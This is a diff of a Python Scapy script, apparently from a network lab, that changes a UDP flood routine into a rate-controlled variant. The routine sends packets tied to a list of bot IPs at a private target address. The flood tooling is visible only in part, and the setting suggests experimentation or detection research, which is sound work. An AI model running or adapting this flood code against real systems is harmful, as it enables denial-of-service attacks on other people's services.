@@ -5,11 +5,13 @@ import time
 import sys
 import ipaddress
 
-# UDP Flood (0 bytes)
+# Different PPS
 TARGET_IP = "192.168.100.2"
 TARGET_PORT = 50001
-BOTFILE = "../bots.txt"
-NUM_PACKETS = 100
+BOTFILE = "bots.txt"
+NUM_PACKETS = 1000
+
+PPS = 10 #PPS
 
 def load_bots(filename):
     bot_ips = []
@@ -23,8 +25,7 @@ def load_bots(filename):
 
     return bot_ips
 
-def run_udp_flood_attack():
-    """UDP Flood Attack"""
+def run_different_pps():
     bot_ips = load_bots(BOTFILE)
 
     numero_de_pacotes_enviados = 0
@@ -49,7 +50,7 @@ def run_udp_flood_attack():
 
 
     start_time = time.perf_counter()
-    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
+    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True, pps=PPS)
     end_time = time.perf_counter()
     duration = end_time - start_time
 
@@ -58,6 +59,6 @@ def run_udp_flood_attack():
 
 
 if __name__ == "__main__":
-    run_udp_flood_attack()
+    run_different_pps()
 
-# sudo PYTHONPATH=$HOME/scapy python3 udp_flood_0bytes.py
+# sudo PYTHONPATH=$HOME/scapy python3 different_pps.py
